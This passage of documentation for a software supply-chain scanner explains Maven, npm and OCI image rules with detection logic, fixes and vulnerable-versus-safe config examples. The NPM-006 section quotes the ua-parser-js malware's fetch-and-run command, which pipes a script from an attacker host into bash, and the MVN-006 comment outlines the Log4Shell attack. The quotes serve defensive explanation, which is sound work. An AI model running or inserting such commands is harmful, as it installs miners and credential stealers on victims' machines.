**Recommendation.** Every ``<dependency>`` must carry a ``<version>``, either inline or via a ``<dependencyManagement>`` block in this POM or a parent. Implicit-version dependencies inherit whatever Maven resolves at build time (often the highest available release), so a maintainer push to a higher version reaches the build unobserved. If the version is genuinely managed by a parent POM, declare it in this POM's ``<dependencyManagement>`` so the resolved version is at least pinned at the project level.

**Known false positives.**

- Spring Boot starters and other BOM-managed dependencies intentionally omit ``<version>`` so the imported BOM decides. The rule still fires because the BOM is not visible at static-analysis time; suppress with a rationale naming the BOM POM, or import the BOM explicitly into this project's ``<dependencyManagement>``.

**Source:** [`MVN-004`](../providers/maven.md#mvn-004) in the [maven provider](../providers/maven.md).

### `MVN-005`: Maven repository accepts artifacts without strict checksum gating <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-005 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires when any ``<repository>`` / ``<pluginRepository>`` declares ``<checksumPolicy>warn</checksumPolicy>`` or ``<checksumPolicy>ignore</checksumPolicy>`` (explicitly weakened from the default), or when the policy is absent AND the URL is not Maven Central (Central enforces checksums server-side, so the policy is moot for that single repo). Internal mirrors and third-party repositories are the canonical place this rule fires.

**Recommendation.** On every ``<repository>``, set ``<checksumPolicy>fail</checksumPolicy>`` under both ``<releases>`` and ``<snapshots>``. Maven's default policy is ``warn``: a checksum mismatch logs a line and the build continues with the tampered artifact. ``fail`` halts on any mismatch, which is the only setting that actually gates the build on checksum integrity. For Maven 3.9.x and newer, prefer the global ``-C`` / ``-c`` invocation flag in CI plus per-repo ``fail`` so a missing checksumPolicy doesn't downgrade to warn at runtime.

**Known false positives.**

- Internal artifact repositories with server-side checksum verification (a Nexus / Artifactory deployment configured to reject mismatched uploads) functionally meet the control even with ``warn`` at the client. The rule cannot see the server-side policy; suppress with a rationale naming the platform / version that enforces it.

**Source:** [`MVN-005`](../providers/maven.md#mvn-005) in the [maven provider](../providers/maven.md).

### `MVN-006`: pom.xml pins a known-compromised Maven Central artifact version <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-mvn-006 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS, [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Walks every non-managed dependency against the curated compromised-package registry in ``pipeline_check.core.checks.maven._compromised_packages``. Group/artifact matching is case-insensitive; version matching is exact (with optional regex fallback for advisories that span a range). Property references are resolved against the POM's ``<properties>`` block so ``${log4j.version}`` is checked against its resolved value. ``<dependencyManagement>`` entries are skipped to avoid double-counting when the same coordinate is both managed and consumed.

**Recommendation.** Bump the affected dependency to a post-incident clean version announced in the citing advisory. For Log4Shell and Spring4Shell class CVEs, rotate any secret reachable to production processes during the exposure window (most Maven-side advisories enable unauthenticated RCE on the deployed app, so any in-process credential should be considered exposed). Pair with MVN-005 (strict checksum policy) so future bytes published at the same coordinate are rejected, and with a vuln-scanning step (Snyk, Dependency-Check) for breadth beyond the curated registry.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises and a small set of canonical CVE-mapped vulnerable versions (Log4Shell, Spring4Shell, Text4Shell). For broader CVE coverage, run a dependency-vulnerability scanner (OWASP Dependency-Check, Snyk, Trivy) alongside pipeline-check; MVN-006 is the curated supply-chain anchor.

**Seen in the wild.**

- Log4Shell, CVE-2021-44228 (December 2021): the canonical Maven-side ecosystem-wide RCE. Mass exploitation began within hours of public disclosure. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Spring4Shell, CVE-2022-22965 (March 2022): RCE via the spring-beans data-binding path on JDK 9+ WAR deployments. https://nvd.nist.gov/vuln/detail/CVE-2022-22965

**Proof of exploit.**

```
<!-- Vulnerable: pinned to a Log4Shell-affected version. -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.14.1</version>
</dependency>

<!-- Attack: any log line that interpolates an attacker-
     controlled string (User-Agent, search field) triggers
     a JNDI lookup, which fetches and executes attacker-
     served bytecode. One curl is enough to RCE. -->

<!-- Safe: post-incident clean version. 2.17.1 disables
     the JNDI lookup substitution entirely. -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.17.1</version>
</dependency>
```

**Source:** [`MVN-006`](../providers/maven.md#mvn-006) in the [maven provider](../providers/maven.md).

### `MVN-007`: settings.xml mirror routes external traffic through one repo <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-007 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires on any ``<mirror>`` in a ``settings.xml`` whose ``<mirrorOf>`` value is ``*`` or ``external:*`` (the two patterns that capture arbitrary external traffic). Repository-specific patterns (``central``, ``!internal-only,*``) and explicit allowlists are exempt. Project POMs that don't carry a ``<mirrors>`` block silently pass.

**Recommendation.** Replace ``<mirrorOf>*</mirrorOf>`` and ``<mirrorOf>external:*</mirrorOf>`` with a narrowly-scoped list naming the upstream repositories you actually want to redirect (``central``, ``central,jcenter``). A wildcard mirror routes every dependency, including ones declared by transitive POMs the build hasn't approved, through the mirror operator: a single compromise of that mirror compromises every artifact the build resolves. Pin the mirror URL to ``https://`` and audit the mirror operator's publishing controls.

**Known false positives.**

- Single-team artifact-proxy patterns (one Nexus / Artifactory acting as the universal upstream front) legitimately use ``<mirrorOf>*</mirrorOf>`` and rely on the proxy's own access controls. If the proxy is a controlled artifact-allowlist target rather than a passthrough, suppress with a rationale naming the proxy endpoint and the allowlist that gates it.

**Source:** [`MVN-007`](../providers/maven.md#mvn-007) in the [maven provider](../providers/maven.md).

### `NPM-001`: package.json dependency uses a floating version range <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-npm-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires on every entry in ``dependencies`` / ``devDependencies`` / ``optionalDependencies`` / ``peerDependencies`` whose value starts with ``^``, ``~``, ``*``, ``>``, ``<``, ``||``, or is the dist-tag ``latest`` / ``next`` / ``beta`` / ``alpha`` / ``canary`` / ``dev``. ``workspace:*`` (Yarn / pnpm workspace protocol), ``file:`` / ``link:`` (local checkouts), ``git+`` / ``http(s)://`` (URL deps), and ``npm:`` (alias) are not version ranges and are routed to other rules. Complements NPM-002, which catches lockfile entries missing integrity hashes; NPM-001 is the manifest-side hygiene.

**Recommendation.** Replace floating range specifiers (``^``, ``~``, ``*``, ``>=``, ``latest``) with an exact version pin (``"lodash": "4.17.21"``). The floating form lets npm install any later version that matches the range, so a compromised patch release (TanStack, axios, debug, Shai-Hulud) reaches the build without a code change. Pair the pinned manifest with a committed ``package-lock.json`` (NPM-002 / NPM-003 guard the lockfile content).

**Known false positives.**

- Monorepo packages that pin every dep to a workspace-internal version often use ``workspace:*``; those are skipped by the rule. Library packages (``private: false``, ``main`` set) intentionally use ranges in ``peerDependencies`` so consumers can satisfy them flexibly; suppress with a one-line rationale for libraries you publish to npm.

**Seen in the wild.**

- TanStack / Mistral npm compromise (May 2026): 84 versions across 42 packages published in minutes, each carrying a credential-stealing ``postinstall``. Consumers with floating ranges (``^x.y.z``) installed the poisoned versions on the next install; pinned exact-version repos were spared until they manually bumped.

**Source:** [`NPM-001`](../providers/npm.md) in the [npm provider](../providers/npm.md).

### `NPM-002`: package-lock.json entry missing integrity hash <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-002 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Walks every entry under ``packages`` (npm 7+ schema ``lockfileVersion: 2`` / ``3``) or ``dependencies`` (npm 6 schema ``lockfileVersion: 1``) and flags records missing an ``integrity`` field that has a ``resolved`` URL (a fetched tarball without integrity is the unsafe case). Skips link entries (``link: true``) and workspace entries, which have no tarball to hash. Local file dependencies (``file:`` specs) are caught by NPM-003. Complements NPM-003 (non-registry source URL); NPM-002 is the case where the source URL exists but the verification anchor doesn't.

**Recommendation.** Regenerate the lockfile with ``npm install`` against a registry that returns SRI integrity hashes (the default ``https://registry.npmjs.org``). Every entry should carry an ``integrity`` field like ``sha512-...`` keyed off the tarball contents. A missing hash means npm has nothing to compare against at install time, so a registry that swaps the tarball mid-flight (cache poisoning, MITM, malicious mirror) ships arbitrary code without detection.

**Known false positives.**

- Lockfiles produced by old npm versions (npm < 5) wrote ``sha1-...`` integrity strings that some downstream tools regenerate as missing. The fix is the same in both cases: regenerate with a current npm version against a hash-providing registry.

**Proof of exploit.**

```
// Vulnerable: ``resolved`` URL is present but ``integrity``
// is missing. npm has nothing to compare against at install
// time, so a registry that swaps the tarball mid-flight
// (cache poisoning, MITM, malicious mirror, account
// republish) ships arbitrary code without any signal.
// package-lock.json
{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
      // no "integrity" field
    }
  }
}

// Safe: regenerate with ``npm install`` against the default
// registry. Every fetched-tarball entry carries an SRI
// ``integrity: sha512-...`` field. npm refuses installs
// whose tarball bytes don't hash to that value.
// package-lock.json
{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry...AJv8XZ1tvj5FvSg=="
    }
  }
}
```

**Source:** [`NPM-002`](../providers/npm.md) in the [npm provider](../providers/npm.md).

### `NPM-003`: package-lock.json entry resolves from a non-registry source <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-003 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires when a lockfile entry's ``resolved`` URL points at anything other than an HTTPS registry. Detected shapes:

* ``git+ssh://`` / ``ssh://`` — opaque, unreviewable
* ``git+http://`` / ``git://`` / ``http://`` — unencrypted transport, MITM surface
* ``file:`` referencing anything outside the project tree — host-specific install

Standard ``https://registry.npmjs.org`` and other registered registries (GitHub Packages, Verdaccio, internal proxies) pass. A ``git+https://`` URL with a 40-character SHA also passes — that's the documented escape hatch for forks not yet published to a registry. Complements NPM-002 (missing integrity hash); NPM-003 catches the *source* shape, NPM-002 catches the *verification* shape.

**Recommendation.** Move the dependency to a hash-verifiable registry source. If you genuinely need a fork that's not on npm, pin it via ``git+https://host/owner/repo.git#<40-char-sha>`` (exact commit, not a branch or tag) and document the audit trail. ``git+ssh://`` URLs are unreviewable by anyone without access to the same private SSH endpoint; ``http://`` URLs are MITM-able; bare ``file:`` paths bind the build to a developer-machine layout. The default-safe shape is ``https://registry.npmjs.org/...`` with ``integrity: sha512-...``, anything else needs a one-line rationale.

**Proof of exploit.**

```
// Vulnerable: ``resolved`` URL is git+ssh — a fork pulled
// from an upstream the team can't audit publicly. The
// branch ``@main`` is mutable; whoever can push to the
// upstream ships code into every consumer's build.
// package-lock.json
{
  "packages": {
    "node_modules/internal-fork": {
      "version": "1.0.0",
      "resolved": "git+ssh://git@github.com/myorg/upstream-fork.git#main"
    }
  }
}

// Safe: publish the fork to a registry you control (GitHub
// Packages, Verdaccio, npm scoped package) and pin via
// version + integrity. If the upstream truly can't move,
// pin via ``git+https://...#<40-char-sha>`` so the git
// object is immutable.
// package-lock.json
{
  "packages": {
    "node_modules/internal-fork": {
      "version": "1.0.0",
      "resolved": "https://npm.pkg.github.com/myorg/internal-fork/-/internal-fork-1.0.0.tgz",
      "integrity": "sha512-abc123...=="
    }
  }
}
```

**Source:** [`NPM-003`](../providers/npm.md) in the [npm provider](../providers/npm.md).

### `NPM-004`: package.json declares an install-time lifecycle script <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-004 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires when ``package.json`` ``scripts`` declares any of:

* ``preinstall`` — runs before dependencies install
* ``install`` — the canonical install hook (rarely needed; node-gyp triggers this automatically when ``binding.gyp`` exists, no script needed)
* ``postinstall`` — runs after dependencies install; the Shai-Hulud worm primitive
* ``prepare`` — runs on ``npm install`` (no args) and on ``npm publish``; effectively a postinstall for consumers

This rule guards the *package you're publishing*. To stop *consumed* dependencies from running their install scripts during your build, use ``npm ci --ignore-scripts`` (DF-024 in the Dockerfile pack). Together they cover both sides of the lifecycle-script attack surface.

**Recommendation.** Move the work out of ``preinstall`` / ``install`` / ``postinstall`` / ``prepare`` and into an explicit script (``"build": "..."``) invoked at a controlled point in your pipeline. Install-time scripts run on every consumer's machine the moment they ``npm install`` your package, with the consumer's environment (``GH_TOKEN``, ``NPM_TOKEN``, AWS env, SSH keys). They're also the propagation primitive the Shai-Hulud worm used to spread across the npm ecosystem in 2026. If your package legitimately needs native-module compilation, document it in the README and expose the build via ``"build": "node-gyp rebuild"`` so consumers opt in by calling ``npm run build`` rather than being opted in by ``npm install``.

**Known false positives.**

- Packages that wrap a binary release (``esbuild``, ``swc``) use ``postinstall`` to download the platform-specific binary. Suppress with a one-line rationale that names the binary source URL and the integrity check the script performs. If the script has neither, the package is the anti-pattern, not the rule.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the postinstall in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. Removing the install-time script primitive on the *publisher* side is the structural fix.

**Proof of exploit.**

```
// Vulnerable: every consumer who runs ``npm install`` on
// this package executes ``setup.js`` with THEIR
// credentials (``GH_TOKEN``, ``NPM_TOKEN``, AWS env, SSH
// keys) silently — they didn't opt into anything beyond
// installing the dependency. This is the Shai-Hulud worm
// propagation primitive.
// package.json
{
  "name": "my-lib",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node setup.js"
  }
}

// Safe: move the work into an explicit script and document
// the opt-in in the README. Consumers who need it run
// ``npm run build`` after the install; consumers who don't
// pay no cost. If you genuinely need native-module
// compilation, ``node-gyp`` triggers ``install`` from a
// ``binding.gyp`` without a ``scripts`` entry, so the
// scripts block can stay empty.
// package.json
{
  "name": "my-lib",
  "version": "1.0.0",
  "scripts": {
    "build": "node setup.js"
  }
}
```

**Source:** [`NPM-004`](../providers/npm.md) in the [npm provider](../providers/npm.md).

### `NPM-005`: package.json git dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-005 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires on dependency specs of the shapes:

* ``git+https://host/owner/repo.git#<ref>`` where ``<ref>`` is not a 40-character SHA
* ``github:owner/repo#<ref>`` (shorthand) with non-SHA ``<ref>``
* ``git+ssh://...``, ``git://...`` (these are also caught by NPM-003 on the lockfile side; flagging here gives users the manifest-side signal too)
* A bare ``github:owner/repo`` with no ``#`` ref at all (resolves to ``HEAD`` of the default branch — fully mutable)

Skips entries already routed elsewhere: registry specs (NPM-001), ``file:`` / ``link:`` / ``workspace:`` (NPM-003).

**Recommendation.** Pin the git dependency to a 40-character commit SHA: ``"foo": "git+https://github.com/owner/repo.git#<sha>"``. Branch refs (``#main``, ``#master``) and tag refs (``#v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the dependency string. A commit SHA is immutable; a tampered upstream cannot redirect ``#<sha>`` to different content. If the upstream isn't yours, vendor the fork into a registry you control (GitHub Packages, internal Verdaccio) and pin via registry version instead.

**Proof of exploit.**

```
// Vulnerable: every ``npm install`` re-resolves ``#main``
// against the upstream repo's HEAD. A push to ``main``
// (legitimate co-maintainer commit, leaked PAT, hijacked
// upstream account) ships into your build silently on the
// next install. ``github:`` shorthand without any ``#``
// is the same — resolves to default-branch HEAD.
// package.json
{
  "dependencies": {
    "util-fork": "git+https://github.com/myorg/util-fork.git#main",
    "tiny-lib": "github:other-org/tiny-lib"
  }
}

// Safe: pin to a 40-character commit SHA. The git object
// is immutable — a re-push at the upstream side cannot
// retarget ``#<sha>`` to different content. Renovate /
// Dependabot's npm-vcs ecosystem updaters bump these in
// reviewable PRs.
// package.json
{
  "dependencies": {
    "util-fork": "git+https://github.com/myorg/util-fork.git#0123456789abcdef0123456789abcdef01234567",
    "tiny-lib": "github:other-org/tiny-lib#fedcba9876543210fedcba9876543210fedcba98"
  }
}
```

**Source:** [`NPM-005`](../providers/npm.md) in the [npm provider](../providers/npm.md).

### `NPM-006`: package-lock.json pins a known-compromised package version <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-npm-006 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS, [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Walks every entry in the lockfile (npm 7+ ``packages`` map and npm 6 ``dependencies`` tree) against the curated compromised-package registry in ``pipeline_check.core.checks.npm._compromised_packages``. Match is case-insensitive on package name and exact on version literal (with optional regex fallback for advisories that span a range). Lockfile coverage means both direct dependencies *and* transitive ones are caught — the more common attack shape, where ``axios -> plain-crypto-js`` (March 2026) pulled in a backdoored transitive that the direct ``package.json`` declaration never mentioned. Registry is hand-curated and append-only; refresh by PR with the citing CVE / GHSA / vendor advisory in the commit message.

**Recommendation.** Rotate every secret reachable to any process that ran ``npm install`` against this lockfile during the window the compromised version was installed. Bump the affected dependency to a post-incident clean version published by the upstream maintainer (announced in the citing advisory), regenerate the lockfile, and audit CI build logs for the exfiltration shape the advisory documents. Pair with NPM-004 (install-time lifecycle scripts) so the postinstall primitive most npm compromises rely on is disabled at the publisher side, and DF-024 (``--ignore-scripts``) so the image build can't re-enable it.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing advisory exists. For broader coverage, run ``npm audit`` or ``osv-scanner`` alongside pipeline-check; NPM-006 is the curated supply-chain anchor, not a vulnerability database.

**Seen in the wild.**

- event-stream 3.3.6 (Nov 2018): canonical npm maintainer-takeover. The hijacked publisher added a malicious ``flatmap-stream`` transitive that targeted Copay wallet builds. https://github.com/dominictarr/event-stream/issues/116
- ua-parser-js compromise ([CVE-2021-43547](https://nvd.nist.gov/vuln/detail/CVE-2021-43547), Oct 2021): hijacked maintainer account; the malicious versions ran a crypto miner + password stealer via postinstall on every consumer.
- coa + rc compromise ([GHSA-73qr-pfmq-6rp8](https://github.com/advisories/GHSA-73qr-pfmq-6rp8), Nov 2021): coordinated maintainer-account-takeover campaign hitting two widely-used CLI helpers within hours of each other.

**Proof of exploit.**

```
# Vulnerable: package-lock.json carries a compromised
# version. The current scan flags it because the registry
# entry matches the (name, version) tuple.
{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/ua-parser-js": {
      "version": "0.7.29",
      "resolved": "https://registry.npmjs.org/ua-parser-js/-/ua-parser-js-0.7.29.tgz",
      "integrity": "sha512-..."
    }
  }
}

# Attack: the postinstall on ua-parser-js@0.7.29 fetched a
# second-stage payload and ran it with the consumer's npm-
# install environment:
#   IF (host_os == 'Linux') {
#     curl https://citationsherbe.at/sdd.sh | bash;
#   } ELSE IF (host_os == 'Windows') {
#     Invoke-WebRequest https://citationsherbe.at/sdd.exe ...;
#   }
# The Linux payload installed XMRig (Monero miner); the
# Windows payload installed DanaBot (credential stealer).

# Safe: post-incident clean version. ua-parser-js republished
# 0.7.30 / 0.8.1 / 1.0.1 with the malicious code removed and
# a maintainer-key rotation; pin to those or later.
```

**Source:** [`NPM-006`](../providers/npm.md) in the [npm provider](../providers/npm.md).

### `NPM-007`: .npmrc does not disable install-time lifecycle scripts <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-007 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires when a ``.npmrc`` exists but does NOT declare ``ignore-scripts=true``. Two failure shapes are flagged:

* Explicit re-enable: ``ignore-scripts=false`` — someone   deliberately turned off the protection.
* Implicit default: ``ignore-scripts`` not set — npm's   built-in default is to RUN scripts.

The rule does NOT fire when no ``.npmrc`` exists in the scan path; that case is too broad to flag without generating noise on every JavaScript repo (the npm pack's DF-024 rule catches the same primitive in the image-build path, which most production deployments use). To enforce the rule globally, ship a ``.npmrc`` that declares ``ignore-scripts=true`` and the rule's contract becomes a ratchet: future commits cannot silently re-enable scripts without tripping this check.

Complements NPM-004 (``package.json`` declares its own install-time hook on the publisher side) and DF-024 (``RUN npm install`` without ``--ignore-scripts`` at image-build time). NPM-004 protects consumers of *your* package; NPM-007 protects *you* from compromised transitive dependencies on the next install.

**Recommendation.** Add ``ignore-scripts=true`` to the repo's ``.npmrc``. The setting tells npm / pnpm / Yarn 1 to skip every ``preinstall`` / ``install`` / ``postinstall`` / ``prepare`` hook on every transitive dependency, including the ones added in a future ``npm install``. This is the file-side complement to DF-024 (which catches the same primitive at ``docker build`` time) — DF-024 protects the image, NPM-007 protects the developer laptop and any unattended CI step running ``npm install`` outside a container. If a specific package legitimately needs its build script (a native module like ``better-sqlite3``), allow-list it after the install: ``npm rebuild better-sqlite3``.

**Known false positives.**

- Repos that build native modules via ``node-gyp`` (``better-sqlite3``, ``sharp``, ``canvas``, …) need the lifecycle scripts to compile bindings. The right pattern is to keep ``ignore-scripts=true`` at the top-level install and per-package ``npm rebuild <name>`` after, scoped to the audited native-module set. Suppress only with a one-line rationale that names the specific binding packages.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the postinstall in compromised packages scraped credentials and pushed propagation workflow files. ``ignore-scripts=true`` neutralizes the postinstall primitive at install time — the worm cannot execute its first stage if scripts are disabled.

**Proof of exploit.**

```
# Vulnerable: .npmrc carries the npm default (scripts run).
# A transitive dep with a malicious postinstall (Shai-Hulud,
# TanStack, ua-parser-js 2021) executes with the developer's
# or CI runner's environment on the next ``npm install``.
registry=https://registry.npmjs.org/
# (ignore-scripts not declared — defaults to running scripts)

# Safe: explicit ignore-scripts=true. Postinstall on every
# dep is suppressed at install time. Native modules that
# genuinely need a build (better-sqlite3, sharp) get
# rebuilt explicitly after the install:
registry=https://registry.npmjs.org/
ignore-scripts=true
# Then in the install script:
#   npm ci
#   npm rebuild better-sqlite3 sharp
```

**Source:** [`NPM-007`](../providers/npm.md) in the [npm provider](../providers/npm.md).

### `OCI-001`: Image manifest is missing OCI provenance annotations <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-oci-001 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Without these two annotations a pulled image can't be traced back to a source revision, so an incident-response team has no way to reach the build that produced it. The rule fires on whichever layer the manifest carries (top-level for an index, sub-manifest for a per-platform image); DF-016 catches the same gap at Dockerfile authoring time, OCI-001 catches it once the image has been built and any later ``docker buildx --annotation`` overrides have already been applied.

**Recommendation.** Stamp the image with at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). With ``docker buildx`` this is ``--label org.opencontainers.image.source=...`` plus ``--label org.opencontainers.image.revision=...`` at build time, or set them as image annotations through ``--annotation`` so they appear on the manifest itself (``manifest.annotations`` is what registries surface to ``manifest inspect``).

**Known false positives.**

- Throwaway / scratch images that never leave a developer's machine (e.g. ``image inspect`` of an intermediate build stage) don't need provenance annotations. Suppress via ignore-file rather than removing the rule.

**Source:** [`OCI-001`](../providers/oci.md#oci-001) in the [OCI manifest provider](../providers/oci.md).

### `OCI-002`: Image is missing a build attestation manifest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-002 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Build attestations are the canonical place for SLSA provenance and SBOM data on an OCI image. A multi-platform image index that ships per-architecture manifests but no attestation-manifest sibling means there's no signed record of how the image was built or what's inside it, so consumers can't enforce SLSA Build-L2+ or feed an SBOM into vulnerability triage. A single-platform manifest (no image index) also fails this rule, attestations require the index-of-manifests shape that BuildKit produces by default.

**Recommendation.** Build the image with ``docker buildx build --attest=type=provenance,mode=max --attest=type=sbom`` (or the equivalent BuildKit frontend flags). Both attestations land as sibling sub-manifests inside the image index, annotated with ``vnd.docker.reference.type: attestation-manifest`` and linked to their target manifest via ``vnd.docker.reference.digest``. Verify after pushing with ``docker buildx imagetools inspect <ref>``, the ``Attestations`` section should list both predicate types.

**Known false positives.**

- Intermediate / cache-only images pushed by CI for later-stage consumption may legitimately ship without attestations to keep build artifacts small. Suppress via ignore-file when this is the deliberate shape, the default expectation for any image that reaches a production registry is a full attestation set.
- Some registries strip the attestation sub-manifests on pull (``docker pull`` of a single platform unwraps the index). If the JSON you're scanning came from ``docker manifest inspect`` rather than ``docker buildx imagetools inspect --raw``, attestations may be invisible even when present upstream.

**Proof of exploit.**

```
# Vulnerable: the image index ships per-architecture
# manifests but no ``attestation-manifest`` sibling. A
# downstream verifier (cosign verify-attestation,
# slsa-verifier, policy-controller) has nothing to check
# against, so the deployment can't enforce "only run
# images with a SLSA L3 build attestation".
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.index.v1+json",
  "manifests": [
    { "digest": "sha256:linux-amd64...",
      "platform": {"architecture": "amd64", "os": "linux"} },
    { "digest": "sha256:linux-arm64...",
      "platform": {"architecture": "arm64", "os": "linux"} }
  ]
}

# Safe: build with ``docker buildx build
# --attest=type=provenance,mode=max --attest=type=sbom``
# so the index carries attestation-manifest siblings
# linking SLSA provenance + SBOM to each per-platform
# manifest by digest.
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.index.v1+json",
  "manifests": [
    { "digest": "sha256:linux-amd64...",
      "platform": {"architecture": "amd64", "os": "linux"} },
    { "digest": "sha256:linux-arm64...",
      "platform": {"architecture": "arm64", "os": "linux"} },
    {
      "digest": "sha256:attest-amd64...",
      "platform": {"architecture": "unknown", "os": "unknown"},
      "annotations": {
        "vnd.docker.reference.type": "attestation-manifest",
        "vnd.docker.reference.digest": "sha256:linux-amd64..."
      }
    }
  ]
}
```

**Source:** [`OCI-002`](../providers/oci.md#oci-002) in the [OCI manifest provider](../providers/oci.md).

### `OCI-003`: Image manifest is missing the ``image.created`` annotation <span class="pg-sev pg-sev--low">LOW</span> { #detail-oci-003 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Image age isn't a security boundary on its own, but a missing ``image.created`` annotation makes routine triage questions ("is this image stale enough to warrant a rebuild?", "was this image built before or after the CVE-2024-XXXX advisory?") much harder to answer automatically. Surfacing the gap as LOW-severity catches the omission early without overwhelming reports for an otherwise-well-formed image.

**Recommendation.** Stamp ``org.opencontainers.image.created`` with the build timestamp (RFC 3339 / ISO 8601, e.g. ``2025-01-30T18:00:00Z``). With ``docker buildx`` either pass ``--label org.opencontainers.image.created=$(date -u +%Y-%m-%dT%H:%M:%SZ)`` at build time, or rely on the BuildKit frontend default which does it automatically when ``SOURCE_DATE_EPOCH`` is unset. The annotation lets downstream vuln scanners and registries surface image age, which is the lightest-weight CVE-triage signal available without pulling the config blob.

**Known false positives.**

- Reproducible-build pipelines deliberately omit ``image.created`` (or pin it to ``SOURCE_DATE_EPOCH``) so the same source produces a byte-identical image. Suppress via ignore-file when reproducibility is the goal.

**Source:** [`OCI-003`](../providers/oci.md#oci-003) in the [OCI manifest provider](../providers/oci.md).

### `OCI-005`: Image manifest is missing the ``image.licenses`` annotation <span class="pg-sev pg-sev--low">LOW</span> { #detail-oci-005 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Without ``image.licenses`` an SBOM tool either has to fall back to scanning the layer contents (slow, best-effort) or simply mark the image as ``license: unknown`` in compliance reports. The same field is what container registries surface to the operator UI, so its absence also makes manual license review harder. The rule is LOW severity because a missing license is a hygiene gap rather than a security boundary, but it ratchets up SBOM quality enough that it's worth catching at scan time.

**Recommendation.** Stamp ``org.opencontainers.image.licenses`` with the SPDX expression for the image's contents (e.g. ``Apache-2.0``, ``MIT AND Apache-2.0``, ``Apache-2.0 WITH LLVM-exception``). With ``docker buildx`` the simplest path is to add ``--label org.opencontainers.image.licenses=Apache-2.0`` (or, for annotation-based propagation onto the manifest, ``--annotation manifest:org.opencontainers.image.licenses=Apache-2.0``). The OCI image-spec annotation is a well-known SPDX expression carrier, downstream SBOM generators and registry UIs read it directly without needing per-tool configuration.

**Known false positives.**

- Internal images that never leave a private registry and aren't subject to OSS license compliance audits may legitimately omit the annotation. Suppress via ignore-file when this is the deliberate stance.
- Multi-license images with ambiguous coverage (e.g. a base image plus mixed-license app code) sometimes skip the annotation rather than emit a misleading single-license value. In that case, the correct fix is to emit the SPDX compound expression (``MIT AND Apache-2.0``); suppression is the wrong answer.

**Source:** [`OCI-005`](../providers/oci.md#oci-005) in the [OCI manifest provider](../providers/oci.md).

### `OCI-007`: Image manifest uses legacy schemaVersion 1 (no content addressing) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-007 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** The OCI image-spec (1.0+) and Docker Distribution v2 both encode ``schemaVersion: 2`` on every manifest. The older Docker v1 format set ``schemaVersion: 1`` and stored the rootfs as a chain of un-addressed tarballs with the chain identity hashed end-to-end at pull time. Anything below 2 is by definition a non-content-addressed manifest. The detection is a strict equality check against schemaVersion.

